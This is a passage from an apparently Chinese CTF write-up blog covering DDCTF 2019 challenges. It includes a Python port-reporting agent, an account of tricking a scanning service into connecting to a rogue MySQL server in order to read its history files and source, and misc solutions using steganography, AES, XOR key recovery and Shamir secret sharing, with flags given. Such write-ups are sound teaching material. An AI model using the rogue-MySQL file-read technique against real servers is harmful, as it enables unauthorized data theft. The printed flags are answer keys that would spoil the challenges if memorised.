class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 12/1/2019 2:58 PM</span><br><span class="line"># @Author  : fz</span><br><span class="line"># @Site    : </span><br><span class="line"># @File    : agent.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">from subprocess import Popen, PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RequestHandler(BaseHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        print(&quot;\n----- Request Start -----&gt;\n&quot;)</span><br><span class="line">        print(&quot;request_path :&quot;, request_path)</span><br><span class="line">        print(&quot;self.headers :&quot;, self.headers)</span><br><span class="line">        print(&quot;&lt;----- Request End -----\n&quot;)</span><br><span class="line"></span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">        result = self._func()</span><br><span class="line">        self.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def do_POST(self):</span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        # print(&quot;\n----- Request Start -----&gt;\n&quot;)</span><br><span class="line">        print(&quot;request_path : %s&quot;, request_path)</span><br><span class="line"></span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(&apos;content-length&apos;)</span><br><span class="line">        length = int(content_length[0]) if content_length else 0</span><br><span class="line"></span><br><span class="line">        # print(&quot;length :&quot;, length)</span><br><span class="line"></span><br><span class="line">        print(&quot;request_headers : %s&quot; % request_headers)</span><br><span class="line">        print(&quot;content : %s&quot; % self.rfile.read(length))</span><br><span class="line">        # print(&quot;&lt;----- Request End -----\n&quot;)</span><br><span class="line"></span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        result = self._func()</span><br><span class="line">        self.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line">    def _func(self):</span><br><span class="line">        netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE)</span><br><span class="line">        netstat.wait()</span><br><span class="line"></span><br><span class="line">        ps_list = netstat.stdout.readlines()</span><br><span class="line">        result = []</span><br><span class="line">        for item in ps_list[2:]:</span><br><span class="line">            tmp = item.split()</span><br><span class="line">            Local_Address = tmp[3]</span><br><span class="line">            Process_name = tmp[6]</span><br><span class="line">            tmp_dic = &#123;&apos;local_address&apos;: Local_Address, &apos;Process_name&apos;: Process_name&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    do_PUT = do_POST</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    port = 8123</span><br><span class="line">    print(&apos;Listening on localhost:%s&apos; % port)</span><br><span class="line">    server = HTTPServer((&apos;0.0.0.0&apos;, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (</span><br><span class="line">        &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot;</span><br><span class="line">        &quot;Run:\n\n&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>要求将他配置在自己的服务器上，代码功能分为三部分，读取get请求（do_GET），读取post请求（do_POST），端口状态检测（_func），启动后会将端口绑定在本地的<strong>8123</strong>端口进行监听</p>
<p>httpserver：</p>
<blockquote>
<p>class http.server.<strong>HTTPServer</strong>(server_address, RequestHandlerClass)<br>This class builds on the TCPServer class by storing the server address as instance variables named server_name and server_port. The server is accessible by the handler, typically through the handler’s server instance variable.</p>
</blockquote>
<p>BaseHTTPRequestHandler：</p>
<blockquote>
<p>class http.server.<strong>BaseHTTPRequestHandler</strong>(request, client_address, server)<br>This class is used to handle the HTTP requests that arrive at the server. By itself, it cannot respond to any actual HTTP requests; it must be subclassed to handle each request method (e.g. GET or POST). BaseHTTPRequestHandler provides a number of class and instance variables, and methods for use by subclasses.</p>
</blockquote>
<p>需要注意的是agent.py中的Process_name需要含有mysqld，直接改源码，端口写3306，然后跑<a href="https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。</a><br><img src="https://upload-images.jianshu.io/upload_images/9113969-12aa8b88d8b2b321.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>接下来就是找flag，可以直接读～/.mysql_history（注：这方法在后期复现时已经不管用了）<br><img src="https://upload-images.jianshu.io/upload_images/9113969-0b6d72ebf211f0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>或者读取~/.bash_history，找到工作目录，读源码<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7a3a9391b3c2c4bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-39fafc2acb6c5e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>/home/dc2-user/ctf_web_2/app/main/views.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from flask import jsonify, request</span><br><span class="line">from struct import unpack</span><br><span class="line">from socket import inet_aton</span><br><span class="line">import MySQLdb</span><br><span class="line">from subprocess import Popen, PIPE</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"># flag in mysql  curl@localhost database:security  table:flag</span><br><span class="line">def weak_scan():</span><br><span class="line">    agent_port = 8123</span><br><span class="line">    result = []</span><br><span class="line">    target_ip = request.args.get(\&apos;target_ip\&apos;)</span><br><span class="line">    target_port = request.args.get(\&apos;target_port\&apos;)</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p>
<p>可以看到flag在security库flag表中。<br>my.cnf<br><img src="https://upload-images.jianshu.io/upload_images/9113969-cbbd8649f1a05f3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>/var/lib/mysql/security/flag.ibd<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7dc23daf844d02e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><blockquote>
<p>Color Threshold</p>
<p>提示：AES ECB密钥为小写字母<br>提示2：密钥不足位用\0补全<br>提示3：不要光记得隐写不看图片本身啊…</p>
</blockquote>
<p><strong>颜色阈值：可以命令将灰度或彩色图像转换为高对比度的黑白图像。</strong></p>
<p>用stegsolve查看图片，lsb，发现一段base64，但是为不可见字符<br><img src="https://impakho.com/images/f0622488ab8ec745dc68568fe54c0905.png" alt=""></p>
<p>用ps打开图片，调整阀值，发现了<strong>魏公村</strong>这个站点有点特殊：<br><img src="https://impakho.com/images/39a3fb90b4177c0095d3c0c283a26916.png" alt=""><br>这里似乎有两种情况，在lsb和rsb情况下的base64不同：</p>
<h4 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">cipher=b64decode(&apos;7SsQWmZ524i/yVWoMeAIJA==&apos;)</span><br><span class="line">key=&apos;weigongcun&apos;.ljust(16,&apos;\x00&apos;)</span><br><span class="line">mode=AES.MODE_ECB</span><br><span class="line"></span><br><span class="line">c=AES.new(key, mode)</span><br><span class="line">print c.decrypt(cipher)</span><br></pre></td></tr></table></figure>
<h4 id="rgb"><a href="#rgb" class="headerlink" title="rgb"></a>rgb</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">k=&quot;iKk/Ju3vu4wOnssdIaUSrg==&quot;</span><br><span class="line">k=k.decode(&quot;base64&quot;)</span><br><span class="line">kirin=AES.new(&quot;weigongcun\x00\x00\x00\x00\x00\x00&quot;,AES.MODE_ECB)</span><br><span class="line">print kirin.decrypt(k)</span><br><span class="line">#DDCTF&#123;CD*Q23&amp;0&#125;</span><br></pre></td></tr></table></figure>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>折腾了半天<br>用wireshark打开，首先<strong>导出对象-&gt;http</strong>,如下图所示：<br><img src="https://i.imgur.com/Sta2aw4.png" alt=""><br>关注<strong>mime_multipart.type</strong>字段，仔细查看，发现了上传图片，于是将图片分离出来<br>具体步骤：选中图片信息的字段，<strong>右键导出分组</strong><br><img src="https://i.imgur.com/prDvD2A.png" alt=""><br>得到三张图：<br><img src="https://i.loli.net/2019/04/19/5cb918c66ab77.png" alt=""><br>第一张图把高度改为07 50，得到key：<br><img src="https://i.loli.net/2019/04/19/5cb918c66b135.png" alt=""><br>再将其他图片拿到数据包分析得出的地址：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a><br>去解密得到：<code>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code><br>再将<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">hex转ascii</a>：<code>lg+Hs-DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}+H-</code></p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><blockquote>
<p>原文为英语，请破解</p>
<p>014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07</p>
</blockquote>
<p>将所给的字符串转为二进制文件：<code>echo &lt;上述字符串&gt;|xxd -r -ps&gt;test</code></p>
<blockquote>
<p>xxd // xxd 命令用于用二进制或十六进制显示文件的内容<br>-r // 把xxd的十六进制输出内容转换回原文件的二进制内容<br>-ps // 以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储</p>
</blockquote>
<p>然后用<a href="https://github.com/hellman/xortool" target="_blank" rel="noopener">xortool</a>进行分析得到：</p>
<blockquote>
<p>$admin~&gt;python xortool -c 20 test<br>The most probable key lengths:<br>   3:   11.9%<br>   6:   19.7%<br>   9:   9.3%<br>  12:   14.5%<br>  15:   7.1%<br>  18:   11.2%<br>  21:   5.4%<br>  24:   8.4%<br>  30:   6.8%<br>  36:   5.7%<br>Key-length can be 3*n<br>2 possible key(s) of length 6:<br>\x0b\rz4\xaa\x12<br>N\rz4\xaa\x12<br>Found 2 plaintexts with 95.0%+ valid characters<br>See files filename-key.csv, filename-char_used-perc_valid.csv</p>
</blockquote>
<p>于是将得到的密钥与原文本进行xor：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=&quot;014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07&quot;</span><br><span class="line">key=key.decode(&quot;hex&quot;)</span><br><span class="line">ans=&quot;&quot;</span><br><span class="line">k=&quot;\x0b\rz4\xaa\x12&quot;	#N\rz4\xaa\x12</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">  ans+=chr(ord(key[i])^ord(k[i%len(k)]))</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure></p>
<p>成功得到flag：DDCTF{07b1b46d1db28843d1fd76889fea9b36}</p>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><blockquote>
<p>为了共同的利益，【组织1】和【组织2】成立了联盟，并遵守共同约定的协议。为了让协议的制定和修改更加公<br>平，组织1和组织2共同决定：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协<br>议。为了实现这一功能，联盟的印章被锁在密码保险柜中，而保险柜的密码只通过Shamir秘密分享方案分享给【组织<br>1】和【组织2】的每一位成员。<br>现在，【组织1】的【成员1】、【成员2】、【成员4】，【组织2】的【成员3】、【成员4】、【成员5】一致同<br>意制定新的协议。请还原出这套方案的设计思路，按照这套方案的思路恢复出保险柜密码，取出印章吧！</p>
<p>以下为使用到的7个十六进制常数：</p>
<p>p =<br>C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4<br>E32D331535F08FC6338748C8447E72763A07F8AF7<br>组织1成员1 =<br>30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF5000<br>0B74A8B8D572B253E63473A0916B69878A779946A<br>组织1成员2 =<br>1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3<br>C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7<br>组织1成员4 =<br>1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF654<br>6BD09720D5D5F3E7BC1A401C8BD7300C253927BBC<br>组织2成员3 =<br>300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E<br>77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA<br>组织2成员4 =<br>1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022<br>957B0C0584199F02790AAC61D7132F7DB6A8F77B9<br>组织2成员5 =<br>9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67C<br>A8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</p>
</blockquote>
<p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing#Example" target="_blank" rel="noopener">shamir算法</a><br><a href="https://wenku.baidu.com/view/6f8ca4290066f5335a81215f.html" target="_blank" rel="noopener">简单解释</a><br>直接套用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 